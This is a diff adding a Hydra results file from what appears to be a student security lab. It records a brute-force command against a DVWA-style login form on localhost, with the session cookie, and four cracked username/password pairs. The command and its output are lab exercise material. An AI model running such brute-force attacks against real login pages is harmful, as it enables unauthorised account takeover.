@@ -1,0 +1,8 @@
+# Hydra v9.5 run at 2026-04-14 17:42:18 on localhost http-get-form (hydra -L /home/pepecortishell/Documents/temp/lab2cripto/informe/dics/u.txt -P /home/pepecortishell/Documents/temp/lab2cripto/informe/dics/p.txt -s 8806 -o /home/pepecortishell/Documents/temp/lab2cripto/informe/hydra/resultados_exitosos2.txt -vV localhost http-get-form /vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: security=low; PHPSESSID=e85e601283e3b30636487e6d4c5613e9:S=Welcome)
+[8806][http-get-form] host: localhost   login: gordonb   password: abc123
+[8806][http-get-form] host: localhost   login: pablo   password: letmein
+[8806][http-get-form] host: localhost   login: 1337   password: charley
+[8806][http-get-form] host: localhost   login: smithy   password: password
+
+--------------------------------------
+Tiempo total de ejecución: 4.711 segundos
